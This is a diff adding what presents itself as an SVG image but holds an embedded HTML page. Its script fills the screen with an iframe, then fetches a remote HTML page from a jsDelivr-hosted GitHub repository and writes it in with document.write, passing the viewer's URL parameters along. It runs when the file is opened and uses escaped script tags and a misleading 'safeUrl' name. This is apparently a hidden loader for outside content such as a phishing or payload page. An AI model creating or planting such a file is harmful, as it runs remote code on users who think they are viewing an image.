@@ -1,0 +1,34 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
+
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <meta content='width=device-width, initial-scale=1.0' name='viewport'></meta>
+      <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe>
+      <script>
+        const params = new URLSearchParams(window.location.search);
+        params.set("t", Date.now());
+        const safeUrl = "https://cdn.jsdelivr.net/gh/CloudMoonApp/web@main/portal-260605.html" + "?" + params.toString();
+        let l = `
+        \x3Cscript>
+        launch();
+        function launch() {
+          try {
+            const url = decodeURIComponent("${safeUrl}");
+            fetch(url).then(response => response.text())
+              .then(html => {
+                document.open();
+                document.write(html);
+                document.close();
+              });
+          } catch (error) {
+            console.error('error:', error);
+          }
+        }
+        \x3C/script>`; 
+        var theIframe = document.getElementById('test'); 
+        theIframe.srcdoc = l;
+      </script>
+    </body>
+  </foreignObject>
+  
+</svg>
